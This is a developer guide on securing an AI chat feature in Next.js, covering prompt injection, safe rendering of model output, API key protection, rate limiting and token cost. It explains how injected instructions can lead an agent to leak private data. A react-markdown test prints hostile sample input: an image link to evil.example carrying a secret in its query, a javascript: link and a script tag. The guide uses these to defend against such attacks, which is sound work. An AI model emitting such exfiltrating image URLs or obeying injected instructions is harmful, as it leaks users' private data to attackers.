---
title: "Security and cost"
description: "Prompt injection, protecting the API key, rate limiting and token cost."
lastVerified: "2026-10-15"
translationKey: "ai/security-and-cost"
---

In an application with an AI feature, two things burn you: an attacker steers the model, or the bill runs away. Both start in the same place. You did not limit who can put what in front of the model, or how much they can use it. This guide covers four subjects in order: prompt injection, protecting the API key, rate limiting and token cost. The examples run on the `/api/chat` route from [The AI SDK and streaming chat](/academy/ai/ai-sdk-and-streaming-chat).

> [!NOTE]
>
> The code in this guide was run with `ai@7.0.140`, `next@16.4.1` and `react-markdown@10.1.0` on Node 22. The prices were taken from Anthropic's pricing page as of October 15, 2026. Prices change, so look at the page before you bake any into your code.[^1]

## Prompt injection

Prompt injection is the model mixing up your instruction with text someone else wrote. There are two kinds. In the direct kind, the user steers the model with their own message. In the indirect kind, the instruction is hidden in a web page, an e-mail, a PDF or a tool result the model reads.[^2]

The real problem is this: in an LLM there is no boundary between instruction and data. That is why the UK's National Cyber Security Centre (NCSC) tells you not to think of prompt injection as SQL injection. In SQL you can parameterize the query and separate the data. There is no such separation in a model, and the problem may never be fully solved.[^3] OWASP also writes that it is unclear whether a perfect mitigation exists.[^2]

So the goal should not be "block the attack". The goal is to keep the damage small even when the attack works.

### The lethal trifecta

[Simon Willison](https://simonwillison.net) describes the danger in agent systems as the combination of three properties:[^4]

1. Access to private data
2. Exposure to untrusted content
3. The ability to communicate with the outside (a path to exfiltrate data)

If all three are in the same agent, an attacker can get private data sent out with an instruction written into the content it reads. [Willison](https://simonwillison.net)'s advice is not to grant that trifecta together. He also does not trust guardrail products that claim they "catch the attack".[^4]

Meta's "Agents Rule of Two" says the same thing like this. In an agent session, have at most two of these three properties:[^5]

- **A:** Processing untrusted input
- **B:** Reaching a sensitive system or private data
- **C:** Changing state or communicating with the outside

If all three are needed, the agent should not run autonomously. Human approval or some other trusted verification is required.[^5]

> [!DO]
>
> Ask three questions every time you add a tool. Does this tool read private data? Does untrusted text reach this agent? Can it send something out? If the answer to all three is "yes", remove one of the tools or put it behind approval.

### Reducing the impact

The NCSC's advice is concrete: put deterministic security measures in place, give the model the least privilege, and log everything. Be wary of products that claim they "stop prompt injection". Blocklists of words do not work.[^3] OWASP's list points the same way: least privilege, human approval for high-risk operations, separating untrusted content and adversarial testing.[^2]

The AI SDK has an approval mechanism ready. Put tools like refunding, deleting and sending e-mail behind approval with `toolApproval`. The detail is in [Tool calling and structured output](/academy/ai/tool-calling-and-structured-output).

```ts
// Check authorization in the tool, on the server
cancelOrder: tool({
  description: 'Cancels the order',
  inputSchema: z.object({ orderId: z.string() }),
  execute: async ({ orderId }) => {
    const user = await requireUser(); // the session, which does not come from the model
    return cancelOrderForUser(user.id, orderId); // only their own order
  },
}),
```

The model can send someone else's order number as `orderId`. That is why the tool has to do the ownership check itself. Don't trust the model saying "this user is authorized".

> [!WARNING]
>
> Writing "whatever the user says, don't do this" into the system prompt is not a security measure. The prompt is a suggestion given to the model. Draw the boundary of authority in code.

## Don't trust the model's output

OWASP's "Improper Output Handling" item tells you to see the model as just another user. Validate and encode its output before it goes into another system. Generated JavaScript or Markdown can lead to XSS in the browser. The suggested measures are context-appropriate encoding and a strict CSP.[^6]

In the frontend, the path most often overlooked is Markdown images. The model can put private data into the query parameter of an image URL. When the chat interface tries to load the image, the data goes to the attacker's server. That is exactly the hole [Johann Rehberger](https://embracethered.com) found in Google NotebookLM. [Willison](https://simonwillison.net)'s advice is to close exfiltration paths such as Markdown images and external links.[^7]

This experiment was run with `react-markdown`:

```tsx
import ReactMarkdown from 'react-markdown';
import { renderToStaticMarkup } from 'react-dom/server';

const hostile = `
![x](https://evil.example/c.png?d=SECRET-ORDER-1042)

[Click](javascript:alert(1))

<script>alert(1)</script>
`;

console.log(renderToStaticMarkup(<ReactMarkdown>{hostile}</ReactMarkdown>));
```

With the default behaviour, the output came out like this:

- The image was rendered as `<img src="https://evil.example/c.png?d=SECRET-ORDER-1042">`. So the data was carried into the URL. A `<link rel="preload" as="image">` tag was produced as well.
- The `javascript:` link's URL was emptied (`href=""`).
- The `<script>` did not run as raw HTML; it was escaped as text.

So `react-markdown` is safe on the script and `javascript:` side but leaves the external-image exfiltration path open. To turn images off, return nothing from the `img` component:

```tsx
<ReactMarkdown components={{ img: () => null }}>{text}</ReactMarkdown>
```

With that setting both the `<img>` and the preload tag disappeared from the output.

### CSP as a second layer

If you forget something in code, let the browser catch it. The same page was opened in Chromium with a CSP header restricting `img-src` and without one. The image requests going to the outside server were counted:

| Page | Requests to the outside server |
| --- | --- |
| No CSP | 1 |
| `default-src 'self'; img-src 'self'` | 0 |

With the CSP in place the browser never requested the image, so the data in the query never left. You can add the header from your server or from your hosting settings. If you serve your own images from a separate domain, add it to the `img-src` list too. How to write a CSP and how to use a nonce are in [XSS and CSP](/academy/auth-security/xss-and-csp).

> [!DONT]
>
> Print model output with `dangerouslySetInnerHTML`. Don't turn Markdown into raw HTML and print that either. Don't turn off the safe defaults of your rendering library.

## Protecting the API key

The easiest way to leak a key into the browser is the `NEXT_PUBLIC_` prefix. According to the Next.js docs, variables with that prefix are written into the browser bundle at build time. The others stay on the Node side only.[^8]

`next build` was run with two fake keys: `NEXT_PUBLIC_FAKE_AI_KEY=sk-test-PUBLIC-1111` and `FAKE_AI_KEY=sk-test-SERVER-2222`. Then both values were searched for in the build output:

| Key | Number of files it appears in |
| --- | --- |
| `NEXT_PUBLIC_FAKE_AI_KEY` | 1, inside `.next/static` |
| `FAKE_AI_KEY` | 0, nowhere under `.next` |

The prefixed key went into the JavaScript everyone downloads. The one without the prefix is nowhere.

> [!CAUTION]
>
> Never put the `NEXT_PUBLIC_` prefix on an AI provider key. The moment you add the prefix, the key is public. If a key leaks, revoke it from the provider's dashboard immediately.

### Read the key in one place

Next.js's data security guide suggests reading `process.env` only in a data access layer (DAL). If you put `import 'server-only'` at the top of that layer, the build fails if the file is ever imported into a Client Component by accident.[^9]

```ts
// lib/ai.ts
import 'server-only';

export function getAiKey() {
  const key = process.env.AI_API_KEY;
  if (!key) throw new Error('AI_API_KEY is not set');
  return key;
}
```

Don't let the browser go to the model directly. Next.js's Backend-for-Frontend guide also tells you to see route handlers as public endpoints. That is, if you don't protect `/api/chat`, anyone on the internet can call it.[^10]

### Key hygiene

Anthropic's key guide suggests this:[^11]

- Don't bake the key into code. Use an environment variable or a secret manager.
- Rotate it regularly (every 90 days, as an example).
- Use a separate key per environment.
- Set a usage limit.
- Run secret scanning on the repository (Gitleaks, as an example).
- If you suspect it has leaked, revoke the key immediately.

According to the guide, GitHub reports a leaked key to Anthropic and the key is disabled. But don't rely on that; add your `.env` file to `.gitignore`.[^11]

If you use the Vercel AI Gateway, you can give an API key a budget and an expiry date.[^12]

## Rate limit

Rate limiting comes up in two directions. One is the limit you put on your users, the other is the one the provider puts on you.

### Your side: a limit per user

In its "Unbounded Consumption" item, OWASP describes uncontrolled usage as "denial of wallet", an attack on your wallet. The measures: an input size limit, rate limiting and a per-user quota, timeouts and monitoring.[^13]

The simplest rate limit is a sliding window kept in memory. On a small test server, 3 requests per second were allowed. Five requests were sent from the same user, then one from another user:

```ts
const hits = new Map<string, number[]>();

function limit(id: string, max = 3, windowMs = 1000) {
  const now = Date.now();
  const recent = (hits.get(id) ?? []).filter((t) => now - t < windowMs);
  if (recent.length >= max) {
    hits.set(id, recent);
    return { success: false, retryAfter: Math.ceil((windowMs - (now - recent[0])) / 1000) };
  }
  recent.push(now);
  hits.set(id, recent);
  return { success: true };
}
```

The result: the first three requests returned `200`, the next two returned `429` with a `retry-after: 1` header. The other user's request got `200`. The limit works per user.

> [!WARNING]
>
> This in-memory version only works in a single process. According to the Next.js docs, some hosting environments run handlers in separate lambdas, and those cannot share data between requests.[^10] In production, keep the counter outside, in Redis for instance.

Upstash Ratelimit is a ready-made solution for serverless. Because it works without a persistent connection (over HTTP), it suits serverless environments:[^14]

```ts
import { Ratelimit } from '@upstash/ratelimit';
import { Redis } from '@upstash/redis';

const ratelimit = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(10, '10 s'),
});

export async function POST(req: Request) {
  const user = await requireUser();
  const { success } = await ratelimit.limit(user.id);
  if (!success) return new Response('Too many requests', { status: 429 });
  // ... streamText
}
```

Next.js's BFF guide shows the same flow: a request over the limit gets a `429`. The guide also suggests turning on the rate limiting on the hosting side.[^10]

> [!TIP]
>
> Limit by IP for anonymous users and by user id for signed-in ones. Put a separate, tighter limit on expensive models.

### The provider's side: 429 and retries

Anthropic's limits are separate per model class, as requests per minute (RPM), input tokens (ITPM) and output tokens (OTPM). The counters refill continuously on a token-bucket basis. If you exceed a limit you get a `429`, and sometimes a `retry-after` header with it. The remaining quota appears in the response headers under `anthropic-ratelimit-*`.[^15]

Two details relate directly to cost:[^15]

- On most models, only input that is not read from the cache counts towards ITPM (`cache_read_input_tokens` does not count). Prompt caching lowers both the bill and the pressure on the limit.
- OTPM counts the real output. The `max_tokens` value does not affect OTPM.

Hitting a spend limit is different. That `429` (`enforced_spend_limit_reached`) carries no `retry-after` and retrying does not help.[^15]

The AI SDK retries automatically on transient errors like a `429`. `maxRetries` defaults to 2. This was tried with a mock model:

| Situation | Result |
| --- | --- |
| The first two calls return `429` (`isRetryable: true`), the third succeeds | 3 calls in total, the response arrives |
| `maxRetries: 0` | 1 call, `AI_APICallError` |
| Always `429`, default settings | 3 calls, `AI_RetryError` |

So with the defaults, one user request can turn into up to three provider calls. If you want to show the user an error quickly, lower `maxRetries`.

## Token cost

### What you are paying for

The charge has three parts: input tokens, output tokens and cache operations. Output is usually several times more expensive than input. The prices per 1 million tokens, taken from Anthropic's pricing page as of October 15, 2026:[^1]

| Model | Input | Output | Cache read |
| --- | --- | --- | --- |
| Haiku 5.5 | $0.10 | $0.50 | |
| Sonnet 5.5 | $2 | $10 | $0.10 |
| Opus 5.5 | $4 | $20 | $0.20 |
| Fable 5.1 / Mythos 5.1 | $10 | $50 | |

The Haiku 5.5 price is for prompts of 100,000 tokens and under. For longer prompts, input becomes $0.50 and output $2.50. On the Batch API the prices drop by 50%.[^1]

Moving the same job between Haiku and Sonnet swings the cost by a wide margin. Give the easy jobs (classification, a short summary) to the small model and the hard ones to the big one.

### Measure the usage

The AI SDK gives you the token usage of every call through `usage` and `totalUsage`. On a multi-step call (tool use), `totalUsage` is the total across every step:

```ts
const result = await generateText({
  model,
  prompt: '...',
  maxOutputTokens: 256,
});

console.log(result.totalUsage);
```

Example output taken with a mock model:

```json
{
  "inputTokens": 1000,
  "inputTokenDetails": { "noCacheTokens": 200, "cacheReadTokens": 700, "cacheWriteTokens": 100 },
  "outputTokens": 300,
  "outputTokenDetails": { "textTokens": 250, "reasoningTokens": 50 },
  "totalTokens": 1300
}
```

You can write a small helper that turns that into an estimated cost. With Sonnet 5.5's prices (input $2, output $10, cache read $0.10, a 5-minute cache write $2.50):

```ts
const PRICE = { input: 2, output: 10, cacheRead: 0.1, cacheWrite: 2.5 }; // $ per 1M tokens

export function estimateCost(u: LanguageModelUsage) {
  const d = u.inputTokenDetails;
  return (
    ((d.noCacheTokens ?? 0) * PRICE.input +
      (d.cacheReadTokens ?? 0) * PRICE.cacheRead +
      (d.cacheWriteTokens ?? 0) * PRICE.cacheWrite +
      (u.outputTokens ?? 0) * PRICE.output) /
    1_000_000
  );
}
```

For the usage above the result is $0.00372. Working it out by hand gives the same: 200×2 + 700×0.1 + 100×2.5 + 300×10 = 3,720, divided by a million.

> [!NOTE]
>
> `reasoningTokens` appears separately on the output side. With reasoning models the bill can be larger than the text you see on screen. Calculate the cost from `outputTokens`, not from `textTokens`.

### Limit the output

`maxOutputTokens` is the cheapest brake. With a mock model, a `maxOutputTokens: 256` value reached the model call exactly as given. For timeouts and cancellation there are `timeout` and `abortSignal`. `abortSignal` was passed to the model call in the same way. Cancelling the request when the user closes the tab cuts off tokens produced for nothing.

```ts
const result = streamText({
  model: 'anthropic/claude-sonnet-5.5',
  messages: await convertToModelMessages(messages),
  maxOutputTokens: 1024,
  abortSignal: req.signal,
});
```

Put a limit on the input side too. Check the number of messages and the total characters in the route, and trim or summarize a long history. That is OWASP's input size limit suggestion.[^13]

### Prompt caching

You can cache long inputs that repeat (the system prompt, the tool list, a document). According to Anthropic:[^16]

- The shortest input that can be cached is 512 tokens for Opus 5.5, Sonnet 5.5, Haiku 5.5, Fable 5.1 and Mythos 5.1.
- The default lifetime is 5 minutes, optionally 1 hour.
- A cache hit costs 0.1× the base input price. On Opus 5.5 and Sonnet 5.5 it is 0.05×.
- A write costs 1.25× for the 5-minute cache and 2× for the 1-hour one.
- A change you make in the tools, the system prompt or the messages invalidates the cache of the levels after it.

So put the fixed part first and the changing part last. On Sonnet 5.5 a read is $0.10 while normal input is $2. On a cache hit, the same input costs a twentieth of the normal price.

In the AI SDK it is turned on for Anthropic with `providerOptions`:[^17]

```ts
const result = await generateText({
  model: anthropic('claude-sonnet-5-5'),
  messages: [
    {
      role: 'system',
      content: longSystemPrompt,
      providerOptions: {
        anthropic: { cacheControl: { type: 'ephemeral' } }, // ttl: '1h' can be passed too
      },
    },
    { role: 'user', content: question },
  ],
});

console.log(result.usage.inputTokenDetails.cacheReadTokens);
```

You can see whether the cache held from the `cacheReadTokens` and `cacheWriteTokens` values. You should see a write on the first call and reads after that.

> [!WARNING]
>
> `providerOptions` is not carried inside `UIMessage`. In a `useChat` flow, convert to model messages with `convertToModelMessages` first and add `providerOptions` to the converted messages yourself.[^17]

> [!NOTE]
>
> The "1024–4096 tokens" minimum length on the AI SDK's Anthropic page does not match Anthropic's current page. For the current value, look at Anthropic's prompt caching page.[^16]

### Budgets with the Gateway

If you use the Vercel AI Gateway, you can set budgets at the team, project, API key and user level. When a budget is exceeded, the request is refused with HTTP `402` and `quota_for_entity_exceeded`. Two details to watch:[^12]

- A budget is a soft limit. The request that exceeds it completes.
- Spend made with your own key (BYOK) does not count towards the budget.

Token usage and cost appear in the request logs too.[^12]

> [!TIP]
>
> Define a spend limit in the provider's dashboard as well. Even if the limits in your code fail, the bill stays under a ceiling. But when that limit is reached you get a `429` and your application stops. Set the alarm below the limit.

## Try it yourself

1. In a small Next.js project, define `NEXT_PUBLIC_FAKE_KEY` and `FAKE_KEY`. Run `next build` and search for both values inside `.next` with `grep -r`.
2. Print a text containing an external image with `react-markdown`. See the request in the Network tab, then add `components={{ img: () => null }}` and look again.
3. Add a CSP header containing `img-src 'self'` to the page and look at the violation message in the console.
4. Add a per-user rate limit to the `/api/chat` route. Request it in a loop with `curl` and see the `429` and the `retry-after`.
5. Log the `result.totalUsage` value and calculate the cost of one conversation with `estimateCost`. Then add `cacheControl` to the system prompt and see `cacheReadTokens` go up.

## Sources

1. [Anthropic: Pricing](https://platform.claude.com/docs/en/about-claude/pricing) *(doc)* — The input, output, cache and batch prices per model.
2. [OWASP: LLM01 Prompt Injection](https://genai.owasp.org/llmrisk/llm01-prompt-injection/) *(doc)* — Direct and indirect prompt injection, the impacts and the mitigations.
3. [NCSC: Prompt injection is not SQL injection (it may be worse)](https://www.ncsc.gov.uk/blog-post/prompt-injection-is-not-sql-injection) *(article)* — The absence of a boundary between instruction and data, and advice for reducing the impact (December 8, 2025).
4. [Simon Willison: The lethal trifecta for AI agents](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/) *(article)* — The combination of private data, untrusted content and communication with the outside (June 16, 2025).
5. [Meta: Agents Rule of Two](https://ai.meta.com/blog/practical-ai-agent-security/) *(article)* — The rule of granting at most two of the three properties in an agent session (October 31, 2025).
6. [OWASP: LLM05 Improper Output Handling](https://genai.owasp.org/llmrisk/llm052025-improper-output-handling/) *(doc)* — Zero trust in model output, encoding and CSP.
7. [Simon Willison: Google NotebookLM Data Exfiltration](https://simonwillison.net/2024/Apr/16/google-notebooklm-data-exfiltration/) *(article)* — Exfiltrating data through a Markdown image URL (April 16, 2024).
8. [Next.js: Environment Variables](https://nextjs.org/docs/app/guides/environment-variables) *(doc)* — The `NEXT_PUBLIC_` prefix going into the browser bundle.
9. [Next.js: Data Security](https://nextjs.org/docs/app/guides/data-security) *(doc)* — The data access layer and `server-only`.
10. [Next.js: Backend for Frontend](https://nextjs.org/docs/app/guides/backend-for-frontend) *(doc)* — Route handlers, the rate limit example and hosting limits.
11. [Anthropic: API key best practices](https://support.claude.com/en/articles/9767949-api-key-best-practices-keeping-your-keys-safe-and-secure) *(doc)* — Storing and rotating a key, limits and what to do about a leak.
12. [Vercel: AI Gateway Budgets](https://vercel.com/docs/ai-gateway/observability-and-spend/budgets) *(doc)* — The budget scopes, the `402` response and the soft limit.
13. [OWASP: LLM10 Unbounded Consumption](https://genai.owasp.org/llmrisk/llm102025-unbounded-consumption/) *(doc)* — Denial of wallet, input limits, rate limiting and quotas.
14. [Upstash: Ratelimit (TypeScript)](https://upstash.com/docs/redis/sdks/ratelimit-ts/overview) *(doc)* — The sliding window and connectionless rate limiting for serverless.
15. [Anthropic: Rate limits](https://platform.claude.com/docs/en/api/rate-limits) *(doc)* — RPM, ITPM, OTPM, `429`, `retry-after` and the response headers.
16. [Anthropic: Prompt caching](https://platform.claude.com/docs/en/build-with-claude/prompt-caching) *(doc)* — The minimum length, the lifetime, the price multipliers and invalidation.
17. [AI SDK: Anthropic provider](https://ai-sdk.dev/providers/ai-sdk-providers/anthropic) *(doc)* — `cacheControl` and where caching is useful.
